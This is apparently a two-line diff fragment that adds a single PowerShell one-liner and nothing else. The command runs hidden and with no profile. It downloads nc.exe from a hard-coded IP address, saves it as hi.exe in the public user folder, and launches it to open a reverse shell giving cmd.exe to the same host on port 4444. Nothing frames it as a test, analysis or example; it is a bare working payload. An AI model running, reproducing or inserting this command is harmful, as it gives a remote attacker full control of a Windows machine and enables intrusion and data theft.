@@ -1,0 +1,2 @@
+powershell.exe -nop -w hidden -c ""IEX ((new-object net.webclient).downloadfile('http://165.227.70.224:5882/nc.exe', 'C:\Users\Public\hi.exe'));C:\Users\Public\hi.exe 165.227.70.224 4444 -e 'cmd.exe'""
+
